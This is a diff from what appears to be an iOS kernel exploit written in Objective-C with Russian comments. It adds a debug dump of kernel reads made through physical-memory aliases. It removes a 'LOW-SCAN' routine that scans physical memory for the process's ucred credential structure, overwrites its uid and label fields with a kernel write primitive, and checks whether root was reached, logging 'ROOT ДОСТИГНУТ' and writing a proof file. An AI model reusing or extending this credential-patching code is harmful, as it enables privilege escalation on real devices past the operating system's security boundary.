@@ -8410,6 +8410,20 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                                 n18lo++;
                                 uint64_t alias = phystokv(pa);
                                 if (!alias) continue;
+                                // 2.0.19: дамп сырых чтений первых трёх — видим,
+                                // что реально отдаёт алиас на низких PA
+                                if (n18lo <= 3) {
+                                    uint64_t d0 = early_kread64(alias + uoff2 + 0x00);
+                                    uint64_t d1 = early_kread64(alias + uoff2 + 0x08);
+                                    uint32_t d2 = (uint32_t)early_kread64(alias + uoff2 + 0x18);
+                                    uint64_t d3 = early_kread64(alias + uoff2 + 0x78);
+                                    uint64_t rwL0 = early_kread64(ucF + 0x00);
+                                    kpNote(r, [NSString stringWithFormat:@"  [T18-DUMP] pa=%#llx alias=%#llx | +0=%#llx (наш rw=%#llx) +8=%#llx uid=%#x +78=%#llx (label=%#llx)",
+                                              (unsigned long long)pa, (unsigned long long)alias,
+                                              (unsigned long long)d0, (unsigned long long)rwL0,
+                                              (unsigned long long)d1, d2,
+                                              (unsigned long long)d3, (unsigned long long)labelQ]);
+                                }
                                 // идентичность: ucred_rw* (+0) объект-уникален
                                 uint64_t rw0 = early_kread64(alias + uoff2 + 0x00);
                                 uint64_t rwL = early_kread64(ucF + 0x00);
@@ -8442,61 +8456,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                             }
                             kpNote(r, [NSString stringWithFormat:@"  [T18-ENUM] кадров типа %d: всего %u, высоких %u, низких %u, ucred_rw-хитов %u — pagePA=%#llx",
                                       uType, n18all, n18hi, n18lo, n18hit, (unsigned long long)pagePA]);
-                            // 2.0.18 [LOW-SCAN] диагностика + широкая сеть: ВСЕ кадры
-                            // <256MB, любой тип, через aperture-алиас. Плюс дамп сырых
-                            // чтений первых кандидаток — если алиас мёртв для низких
-                            // PA, это будет видно (0x0 / 0x5a / мусор вместо данных).
-                            if (!pagePA) {
-                                uint32_t lowHit = 0, lowRead = 0, lowDumped = 0;
-                                for (uint64_t i = 0; i < (0x10000000ULL >> 14) && !pagePA; i++) {
-                                    uint64_t pa = pB + (i << 14);
-                                    uint64_t alias = phystokv(pa);
-                                    if (!alias) continue;
-                                    uint64_t rw0 = early_kread64(alias + uoff2 + 0x00);
-                                    if (lowDumped < 3) {
-                                        uint64_t d0 = rw0, d1 = early_kread64(alias + uoff2 + 0x08);
-                                        uint32_t d2 = (uint32_t)early_kread64(alias + uoff2 + 0x18);
-                                        uint64_t d3 = early_kread64(alias + uoff2 + 0x78);
-                                        kpNote(r, [NSString stringWithFormat:@"  [LOW-SCAN] дамп[%u] pa=%#llx alias=%#llx +0=%#llx +8=%#llx uid=%#x +78=%#llx",
-                                                  lowDumped, (unsigned long long)pa, (unsigned long long)alias,
-                                                  (unsigned long long)d0, (unsigned long long)d1, d2, (unsigned long long)d3]);
-                                        lowDumped++;
-                                    }
-                                    uint64_t rwL = early_kread64(ucF + 0x00);
-                                    uint32_t lu = (uint32_t)early_kread64(alias + uoff2 + 0x18);
-                                    lowRead++;
-                                    BOOL idOK = (rw0 == rwL && lu == uid32);
-                                    // мягкий fallback: label+uid (как в скане)
-                                    if (!idOK) {
-                                        uint64_t lb = early_kread64(alias + uoff2 + 0x78);
-                                        idOK = (lb == labelQ && lu == uid32);
-                                    }
-                                    if (!idOK) continue;
-                                    lowHit++;
-                                    kpNote(r, [NSString stringWithFormat:@"  [LOW-SCAN] ★ ucred-хит pa=%#llx (тип %d) — патч через alias %#llx",
-                                              (unsigned long long)pa, kpFrameTypeOf(pa), (unsigned long long)alias]);
-                                    uint64_t q20 = early_kread64(alias + uoff2 + 0x20);
-                                    uint64_t q28 = early_kread64(alias + uoff2 + 0x28);
-                                    early_kwrite64(alias + uoff2 + 0x18, 0);
-                                    early_kwrite64(alias + uoff2 + 0x20, q20 & 0xFFFFFFFF00000000ULL);
-                                    early_kwrite64(alias + uoff2 + 0x28, q28 & 0xFFFFFFFF00000000ULL);
-                                    early_kwrite64(alias + uoff2 + 0x68, 0);
-                                    early_kwrite64(alias + uoff2 + 0x78, 0);
-                                    uid_t gk = getuid();
-                                    uint32_t cruN = (uint32_t)early_kread64(ucF + 0x18);
-                                    kpNote(r, [NSString stringWithFormat:@"  [LOW-SCAN] readback cr_uid=%u getuid()=%u — %@",
-                                              cruN, gk, (gk == 0 || cruN == 0) ? @"ROOT ★★" : @"не прилипло"]);
-                                    if (gk == 0 || cruN == 0) {
-                                        pagePA = pa;
-                                        gT18Root = YES;
-                                        kpNote(r, @"=== ROOT ДОСТИГНУТ: getuid()==0 — LOW-SCAN in-place ucred через aperture-alias ===");
-                                        FILE *fp = fopen("/private/var/mobile/kexproof-root-probe.txt", "w");
-                                        if (fp) { fputs("root via LOW-SCAN\n", fp); fclose(fp); }
-                                    }
-                                }
-                                kpNote(r, [NSString stringWithFormat:@"  [LOW-SCAN] финиш: чтений=%u хитов=%u pagePA=%#llx",
-                                          lowRead, lowHit, (unsigned long long)pagePA]);
-                            }
+
                         }
                         // Слепой скан закрыт (ucred физически <256MB — DART слеп там,
                         // kernel-чтения убивают). Идём с другой стороны: у чужого
